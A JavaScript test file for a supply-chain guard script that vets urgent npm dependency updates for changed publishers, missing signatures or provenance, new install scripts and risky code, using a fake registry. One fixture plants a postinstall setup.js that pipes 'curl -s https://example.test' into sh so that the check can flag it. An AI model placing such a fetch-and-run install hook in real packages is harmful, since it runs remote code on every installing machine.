/**
 * scripts/urgent-dep-update.cjs against a fake registry and a scratch repo:
 * no network, no real install.
 *
 *   - refuses without an explicit name@version spec, without --reason, with a
 *     --reason that names no advisory id, with a range or a tag, and when
 *     .npmrc lacks min-release-age=7;
 *   - the checks: a changed publisher, a missing signature, provenance lost or
 *     pointing at another repository, a new install script, a new dependency,
 *     new child_process / fs / eval usage and a version younger than the
 *     security lane's 2 days are red flags that stop the run (and are
 *     reported), --force goes on;
 *   - a clean update passes; --dry-run runs every check and installs nothing;
 *     --diff prints the unified diff of the changed source files;
 *   - the install path (with a recording shell): the override for a
 *     transitive package, the right field for a direct one, exactly those
 *     specs with --min-release-age=0, .npmrc untouched, the lockfile diff
 *     limited to the named packages, the test-only packages reinstalled at
 *     the locked playwright-core, the audit note and the commit message.
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const REPO = path.resolve(here, '..');
const require = createRequire(path.join(REPO, 'package.json'));
const udu = require('./scripts/urgent-dep-update.cjs');

let failed = 0;
function check(name, ok, detail = '') {
  if (!ok) failed++;
  console.log(`${ok ? 'PASS' : 'FAIL'}: ${name}${!ok && detail ? ` | ${detail}` : ''}`);
}

// ---------------------------------------------------------------------------
// a scratch repo and a fake registry
// ---------------------------------------------------------------------------
function writeTree(dir, files) {
  for (const [rel, body] of Object.entries(files)) {
    const p = path.join(dir, rel);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, typeof body === 'string' ? body : JSON.stringify(body, null, 2) + '\n');
  }
}
const NPMRC = '; Supply-chain protection\nmin-release-age=7\n';
function makeRepo({ direct = {}, dev = {}, installed = {} } = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'urgent-dep-test-'));
  const pkg = { name: 'scratch', version: '1.0.0', dependencies: direct, devDependencies: dev, overrides: {} };
  const packages = { '': { name: 'scratch', version: '1.0.0', dependencies: direct, devDependencies: dev } };
  packages['node_modules/playwright-core'] = { version: '1.63.0', resolved: 'https://registry.npmjs.org/playwright-core/-/playwright-core-1.63.0.tgz', integrity: 'sha512-pw', dev: true };
  for (const [name, { version, files, integrity }] of Object.entries(installed)) {
    writeTree(path.join(dir, 'node_modules', name), { 'package.json': { name, version, ...((files && files['package.json']) || {}) }, ...Object.fromEntries(Object.entries(files || {}).filter(([k]) => k !== 'package.json')) });
    packages[`node_modules/${name}`] = { version, resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, integrity: integrity || `sha512-${name}-${version}` };
  }
  writeTree(dir, { 'package.json': pkg, 'package-lock.json': { name: 'scratch', lockfileVersion: 3, packages }, '.npmrc': NPMRC });
  return dir;
}
const slsa = (repository, ref = 'refs/tags/v1') => ({ attestations: [{ predicateType: 'https://slsa.dev/provenance/v1', bundle: { dsseEnvelope: { payload: Buffer.from(JSON.stringify({ predicate: { buildDefinition: { externalParameters: { workflow: { repository, ref, path: '.github/workflows/release.yml' } } }, runDetails: { builder: { id: 'https://github.com/actions/runner/github-hosted' } } } })).toString('base64') } } }] });
const DAY = 86400000;
const NOW = Date.parse('2026-10-24T12:00:00Z');
function fakeRegistry({ versions, attestations = {}, tarballs }) {
  return {
    packument: async (name) => versions[name] ? { name, versions: versions[name], time: Object.fromEntries(Object.entries(versions[name]).map(([v, d]) => [v, d.__time])) } : null,
    attestations: async (name, version) => attestations[`${name}@${version}`] || null,
    unpack: async (name, version) => {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'urgent-dep-tarball-'));
      writeTree(dir, tarballs[`${name}@${version}`]);
      return dir;
    },
  };
}
const user = (name) => ({ name, email: `${name}@example.test` });
const baseDoc = (name, version, extra = {}) => ({ name, version, _npmUser: user('maintainer'), dist: { integrity: `sha512-${name}-${version}`, signatures: [{ keyid: 'SHA256:npm' }] }, repository: { type: 'git', url: `git+https://github.com/example/${name}.git` }, __time: new Date(NOW - 3 * DAY).toISOString(), ...extra });
const oldFiles = { 'package.json': { dependencies: { depd: '2.0.0' }, scripts: { test: 'mocha' } }, 'index.js': "'use strict'\nmodule.exports = function parse (s) { return s }\n", 'README.md': '# pkg\n' };
const goodNew = { 'package.json': { name: 'pkg', version: '1.0.1', dependencies: { depd: '2.0.0' }, scripts: { test: 'mocha' } }, 'index.js': "'use strict'\nmodule.exports = function parse (s) { if (s.length > 1e6) throw new Error('too long'); return s }\n", 'README.md': '# pkg\n\n1.0.1: a fix\n' };
function world(newTarball, { newDoc = {}, prevAttest = true, newAttest = true, provRepo = 'https://github.com/example/pkg' } = {}) {
  const repo = makeRepo({ direct: { express: '^4.0.0' }, installed: { pkg: { version: '1.0.0', files: oldFiles } } });
  const versions = { pkg: { '1.0.0': baseDoc('pkg', '1.0.0', { __time: new Date(NOW - 40 * DAY).toISOString() }), '1.0.1': baseDoc('pkg', '1.0.1', newDoc) } };
  const attestations = {};
  if (prevAttest) attestations['pkg@1.0.0'] = slsa('https://github.com/example/pkg');
  if (newAttest) attestations['pkg@1.0.1'] = slsa(provRepo);
  const registry = fakeRegistry({ versions, attestations, tarballs: { 'pkg@1.0.1': newTarball } });
  const calls = [];
  const exec = (cmd, args) => { calls.push([cmd, ...args]); if (args[0] === 'audit' && args[1] === '--json') return { status: 0, stdout: JSON.stringify({ metadata: { vulnerabilities: { total: 0 } } }) }; return { status: 0, stdout: '', stderr: '' }; };
  const lines = [];
  return { repo, registry, calls, exec, lines, log: (s) => lines.push(s), args: (extra = []) => ['pkg@1.0.1', '--reason', 'GHSA-2345-cfgh-jmpq', ...extra] };
}

// ---------------------------------------------------------------------------
// refusals
// ---------------------------------------------------------------------------
{
  const w = world(goodNew);
  let r = await udu.main(['--reason', 'GHSA-x'], { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('refuses without a spec', r.refused && !r.installed && w.lines.some((l) => /at least one explicit/.test(l)));
  r = await udu.main(['pkg@1.0.1'], { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('refuses without --reason', r.refused && !r.installed && w.lines.some((l) => /--reason/.test(l)));
  r = await udu.main(['pkg@1.0.1', '--reason', 'it is newer'], { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('refuses a --reason that names no advisory id', r.refused && !r.installed && w.lines.some((l) => /--reason must name the advisory/.test(l)), w.lines.join('\n'));
  for (const id of ['CVE-2026-116689', 'ghsa-mrwp-f3q8-3g9p', 'PYSEC-2026-4322', 'RHSA-2026:92907', 'GO-2026-6860']) {
    check(`an advisory id of the form ${id.split('-')[0]} is accepted in --reason`, udu.parseArgs(['pkg@1.0.1', '--reason', `fixes ${id}`]).errors.length === 0, JSON.stringify(udu.parseArgs(['pkg@1.0.1', '--reason', `fixes ${id}`]).errors));
  }
  check('a malformed GHSA id is not accepted', udu.parseArgs(['pkg@1.0.1', '--reason', 'GHSA-test-0001']).errors.length === 1);
  r = await udu.main(['pkg@^1.0.1', '--reason', 'x'], { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('refuses a range', r.refused && w.lines.some((l) => /not an explicit name@x\.y\.z/.test(l)));
  r = await udu.main(['pkg@latest', '--reason', 'x'], { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('refuses a tag', r.refused);
  r = await udu.main(['pkg', '--reason', 'x'], { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('refuses a bare name ("update everything" has no spelling here)', r.refused);
  check('nothing was executed by a refusal', w.calls.length === 0, JSON.stringify(w.calls));
  fs.writeFileSync(path.join(w.repo, '.npmrc'), '; nothing\n');
  r = await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('refuses when .npmrc has no min-release-age=7 to bypass', r.refused && w.lines.some((l) => /min-release-age=7/.test(l)));
}

// ---------------------------------------------------------------------------
// the red flags
// ---------------------------------------------------------------------------
{
  const w = world(goodNew, { newDoc: { _npmUser: user('somebody-else') } });
  const r = await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('a changed publisher is a red flag that stops the run', !r.ok && !r.installed && r.flags.some((f) => /publisher changed: "maintainer <maintainer@example.test>" -> "somebody-else/.test(f)), JSON.stringify(r.flags));
  check('the report prints the publisher of both versions and the age', w.lines.some((l) => /publisher somebody-else <somebody-else@example.test> \(installed 1\.0\.0: maintainer/.test(l)) && w.lines.some((l) => /3 days old, younger than min-release-age: within the security lane/.test(l)), w.lines.join('\n'));
  check('nothing was installed', !w.calls.some((c) => c[1] === 'install'));
}
{
  // the security lane's floor: a version younger than 2 days is a red flag, --force goes on
  const w = world(goodNew, { newDoc: { __time: new Date(NOW - 1.5 * DAY).toISOString() } });
  const r = await udu.main(w.args(['--dry-run']), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('a version younger than 2 days is a red flag that stops the run', !r.ok && !r.installed && r.flags.some((f) => /1\.5 days old, younger than the security lane's 2 days/.test(f)), JSON.stringify(r.flags));
  check('the report says so next to the age', w.lines.some((l) => /1\.5 days old, younger than the security lane's 2 days/.test(l)), w.lines.join('\n'));
  const forced = world(goodNew, { newDoc: { __time: new Date(NOW - 1.5 * DAY).toISOString() } });
  const rf = await udu.main(forced.args(['--dry-run', '--force']), { repoDir: forced.repo, registry: forced.registry, exec: forced.exec, log: forced.log, now: NOW });
  check("--force (the maintainer's explicit decision) goes on past the age flag", rf.dryRun && rf.flags.length === 1, JSON.stringify(rf.flags));
  const exact = world(goodNew, { newDoc: { __time: new Date(NOW - 2 * DAY).toISOString() } });
  const re = await udu.main(exact.args(['--dry-run']), { repoDir: exact.repo, registry: exact.registry, exec: exact.exec, log: exact.log, now: NOW });
  check('exactly 2 days old is within the lane (no flag)', re.ok && re.flags.length === 0, JSON.stringify(re.flags));
  const noTime = world(goodNew, { newDoc: { __time: undefined } });
  const rn = await udu.main(noTime.args(['--dry-run']), { repoDir: noTime.repo, registry: noTime.registry, exec: noTime.exec, log: noTime.log, now: NOW });
  check('a version whose publish time the registry does not give is a red flag (the age cannot be checked)', !rn.ok && rn.flags.some((f) => /no publish time/.test(f)), JSON.stringify(rn.flags));
}
{
  const w = world(goodNew, { newDoc: { dist: { integrity: 'sha512-pkg-1.0.1', signatures: [] } } });
  const r = await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('a missing registry signature is a red flag', !r.ok && r.flags.some((f) => /no registry signature/.test(f)), JSON.stringify(r.flags));
}
{
  const w = world(goodNew, { newAttest: false });
  const r = await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('provenance missing where the installed version had it is a red flag', !r.ok && r.flags.some((f) => /no SLSA provenance where 1\.0\.0 had it/.test(f)), JSON.stringify(r.flags));
  const w2 = world(goodNew, { provRepo: 'https://github.com/someone/fork' });
  const r2 = await udu.main(w2.args(), { repoDir: w2.repo, registry: w2.registry, exec: w2.exec, log: w2.log, now: NOW });
  check("provenance from another repository than the package's is a red flag", !r2.ok && r2.flags.some((f) => /provenance repository \(https:\/\/github.com\/someone\/fork\) is not the package's/.test(f)), JSON.stringify(r2.flags));
}
{
  const withScript = { ...goodNew, 'package.json': { ...goodNew['package.json'], scripts: { test: 'mocha', postinstall: 'node setup.js' } }, 'setup.js': "require('child_process').execSync('curl -s https://example.test | sh')\n" };
  const w = world(withScript);
  const r = await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('a new install script is a red flag', !r.ok && r.flags.some((f) => /new or changed install script \(postinstall: \+ "node setup\.js"\)/.test(f)), JSON.stringify(r.flags));
  check('new child_process usage in an added file is a red flag', r.flags.some((f) => /setup\.js: child_process usage 0 -> \d/.test(f)), JSON.stringify(r.flags));
  check('the changed and added files are listed', w.lines.some((l) => /\+ setup\.js/.test(l)) && w.lines.some((l) => /~ index\.js/.test(l)), w.lines.join('\n'));
}
{
  const withDep = { ...goodNew, 'package.json': { ...goodNew['package.json'], dependencies: { depd: '2.0.0', 'left-pad': '^1.3.0' } }, 'index.js': "'use strict'\nconst fs = require('fs')\nmodule.exports = function parse (s) { return eval(s) }\n" };
  const w = world(withDep);
  const r = await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('a new dependency is a red flag', r.flags.some((f) => /dependency change \(dependencies: \+ left-pad@\^1\.3\.0\)/.test(f)), JSON.stringify(r.flags));
  check('new fs and eval usage in a changed file are red flags', r.flags.some((f) => /index\.js: fs usage 0 -> 1/.test(f)) && r.flags.some((f) => /index\.js: eval usage 0 -> 1/.test(f)), JSON.stringify(r.flags));
  const forced = world(withDep);
  const rf = await udu.main(forced.args(['--force', '--dry-run']), { repoDir: forced.repo, registry: forced.registry, exec: forced.exec, log: forced.log, now: NOW });
  check('--force goes on past the red flags (here into a dry run)', rf.dryRun && rf.flags.length > 0 && forced.lines.some((l) => /--force given/.test(l)));
}

// ---------------------------------------------------------------------------
// a clean update: the dry run, then the install path with a recording shell
// ---------------------------------------------------------------------------
{
  const w = world(goodNew);
  const r = await udu.main(w.args(['--dry-run']), { repoDir: w.repo, registry: w.registry, exec: w.exec, log: w.log, now: NOW });
  check('a clean update has no red flag and the dry run installs nothing', r.ok && r.dryRun && !r.installed && r.flags.length === 0 && w.calls.length === 0, JSON.stringify({ flags: r.flags, calls: w.calls }));
  check('the dry run leaves package.json, the lockfile and .npmrc untouched', JSON.parse(fs.readFileSync(path.join(w.repo, 'package.json'), 'utf8')).overrides.pkg === undefined && fs.readFileSync(path.join(w.repo, '.npmrc'), 'utf8') === NPMRC && !fs.existsSync(path.join(w.repo, 'docs', 'security', 'urgent-updates.md')));
  check('the report shows the provenance and the signature', w.lines.some((l) => /provenance https:\/\/github.com\/example\/pkg refs\/tags\/v1/.test(l)) && w.lines.some((l) => /dist\.signatures 1/.test(l)), w.lines.join('\n'));
  check('without --diff no unified diff is printed', !w.lines.some((l) => /--- diff /.test(l)));
  const d = world(goodNew);
  await udu.main(d.args(['--dry-run', '--diff']), { repoDir: d.repo, registry: d.registry, exec: d.exec, log: d.log, now: NOW });
  check('--diff prints the unified diff of each changed source file (index.js and package.json, not README.md)', d.lines.some((l) => /--- diff index\.js/.test(l)) && d.lines.some((l) => /--- diff package\.json/.test(l)) && !d.lines.some((l) => /--- diff README/.test(l)) && d.lines.some((l) => /^\s+\+module\.exports = function parse \(s\) \{ if \(s\.length > 1e6\)/.test(l)) && d.lines.some((l) => /^\s+-module\.exports = function parse \(s\) \{ return s \}/.test(l)), d.lines.join('\n'));
}
{
  // pkg is transitive (an override), express is direct: the shell is recorded and the lockfile "updated" by the fake npm
  const w = world(goodNew);
  const lockPath = path.join(w.repo, 'package-lock.json');
  const fakeNpm = (cmd, args) => {
    w.calls.push([cmd, ...args]);
    if (args[0] === 'install' && !args.includes('--no-save')) {
      const lock = JSON.parse(fs.readFileSync(lockPath, 'utf8'));
      lock.packages['node_modules/pkg'] = { version: '1.0.1', resolved: 'https://registry.npmjs.org/pkg/-/pkg-1.0.1.tgz', integrity: 'sha512-pkg-1.0.1' };
      lock.packages[''].overrides = { pkg: '^1.0.1' };
      fs.writeFileSync(lockPath, JSON.stringify(lock, null, 2));
    }
    if (args[0] === 'install' && args.includes('--no-save')) fs.appendFileSync(lockPath, '\n');   // a --no-save install that dirtied the lock: restored
    if (args[0] === 'audit' && args[1] === '--json') return { status: 0, stdout: JSON.stringify({ metadata: { vulnerabilities: { total: 0 } } }) };
    return { status: 0, stdout: '', stderr: '' };
  };
  const r = await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: fakeNpm, log: w.log, now: NOW });
  check('the clean update installs and ends ok', r.ok && r.installed && r.vulns === 0 && r.signatures, JSON.stringify({ ok: r.ok, results: r.results }));
  const pkg = JSON.parse(fs.readFileSync(path.join(w.repo, 'package.json'), 'utf8'));
  check('a transitive package gets an override ^version', pkg.overrides.pkg === '^1.0.1', JSON.stringify(pkg.overrides));
  const installs = w.calls.filter((c) => c[1] === 'install');
  check('npm install runs with --min-release-age=0 once, for the override, and never edits .npmrc', installs.filter((c) => c.includes('--min-release-age=0')).length === 1 && fs.readFileSync(path.join(w.repo, '.npmrc'), 'utf8') === NPMRC, JSON.stringify(installs));
  check('then npm audit --json and npm audit signatures run', w.calls.some((c) => c[1] === 'audit' && c[2] === '--json') && w.calls.some((c) => c[1] === 'audit' && c[2] === 'signatures'));
  check('the test-only packages are reinstalled with --no-save at the locked playwright-core, and the lockfile they dirtied is restored', installs.some((c) => c.includes('--no-save') && c.includes('jsdom') && c.includes('fake-indexeddb') && c.includes('playwright-core@1.63.0')) && !fs.readFileSync(lockPath, 'utf8').endsWith('\n\n') && r.results.some((x) => /restored/.test(x)), JSON.stringify({ installs, results: r.results }));
  const note = fs.readFileSync(path.join(w.repo, 'docs', 'security', 'urgent-updates.md'), 'utf8');
  check('the audit note is appended with the date, specs, reason, age and the check results', /## 2026-10-24 - pkg@1\.0\.1/.test(note) && /Reason: GHSA-2345-cfgh-jmpq/.test(note) && /3 days old/.test(note) && /npm audit: 0 vulnerabilities/.test(note) && /npm audit signatures: ok/.test(note), note);
  check('the note and the commit message name the publisher account without its e-mail address (the privacy scan reads the log)', /publisher maintainer,/.test(note) && !/@example\.test/.test(note) && w.lines.some((l) => /publisher maintainer, 1 signature\(s\)/.test(l)) && !w.lines.filter((l) => /^(pkg |Security:)/.test(l)).some((l) => /@example\.test/.test(l)), note);
  check('the suggested commit message names the specs and the reason', w.lines.some((l) => /^Security: pkg@1\.0\.1 \(GHSA-2345-cfgh-jmpq\)/.test(l)));
}
{
  // a direct devDependency goes to --save-dev with the caret, nothing in overrides; a lockfile change outside the spec is an error
  const w = world(goodNew);
  const pkgPath = path.join(w.repo, 'package.json');
  const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8')); pkg.devDependencies.pkg = '^1.0.0'; fs.writeFileSync(pkgPath, JSON.stringify(pkg));
  const lockPath = path.join(w.repo, 'package-lock.json');
  const fakeNpm = (cmd, args) => {
    w.calls.push([cmd, ...args]);
    if (args[0] === 'install' && !args.includes('--no-save')) {
      const lock = JSON.parse(fs.readFileSync(lockPath, 'utf8'));
      lock.packages['node_modules/pkg'] = { version: '1.0.1', integrity: 'sha512-pkg-1.0.1', dev: true };
      lock.packages['node_modules/sneaky'] = { version: '9.9.9', integrity: 'sha512-sneaky' };   // something else slipped in
      fs.writeFileSync(lockPath, JSON.stringify(lock));
    }
    return { status: 0, stdout: '{}', stderr: '' };
  };
  let error = null;
  try { await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: fakeNpm, log: w.log, now: NOW }); } catch (e) { error = e; }
  check('a direct devDependency is installed into devDependencies (--save-dev, ^version, --min-release-age=0) with no override', w.calls.some((c) => c[1] === 'install' && c[2] === 'pkg@^1.0.1' && c.includes('--save-dev') && c.includes('--min-release-age=0')) && JSON.parse(fs.readFileSync(pkgPath, 'utf8')).overrides.pkg === undefined, JSON.stringify(w.calls));
  check('a lockfile entry outside the named packages fails the run', error && /lockfile changed outside the named packages: node_modules\/sneaky/.test(error.message), String(error && error.message));
}
{
  // the integrity of the installed entry must equal the registry's
  const w = world(goodNew);
  const lockPath = path.join(w.repo, 'package-lock.json');
  const fakeNpm = (cmd, args) => { w.calls.push([cmd, ...args]); if (args[0] === 'install') { const lock = JSON.parse(fs.readFileSync(lockPath, 'utf8')); lock.packages['node_modules/pkg'] = { version: '1.0.1', integrity: 'sha512-tampered' }; lock.packages[''].overrides = { pkg: '^1.0.1' }; fs.writeFileSync(lockPath, JSON.stringify(lock)); } return { status: 0, stdout: '{}', stderr: '' }; };
  let error = null;
  try { await udu.main(w.args(), { repoDir: w.repo, registry: w.registry, exec: fakeNpm, log: w.log, now: NOW }); } catch (e) { error = e; }
  check("an installed integrity that differs from the registry's fails the run", error && /integrity differs from the registry/.test(error.message), String(error && error.message));
}
// the script is wired and documented
{
  const pkg = JSON.parse(fs.readFileSync(path.join(REPO, 'package.json'), 'utf8'));
  check('package.json has the deps:urgent script', pkg.scripts['deps:urgent'] === 'node scripts/urgent-dep-update.cjs', pkg.scripts['deps:urgent']);
  const dev = fs.readFileSync(path.join(REPO, 'docs', 'DEVELOPMENT.md'), 'utf8');
  check('docs/DEVELOPMENT.md documents it as something done only on the user\'s explicit request', /deps:urgent/.test(dev) && /explicit request/.test(dev));
}

console.log(failed ? `\n${failed} check(s) failed` : '\nAll checks passed');
process.exit(failed ? 1 : 0);
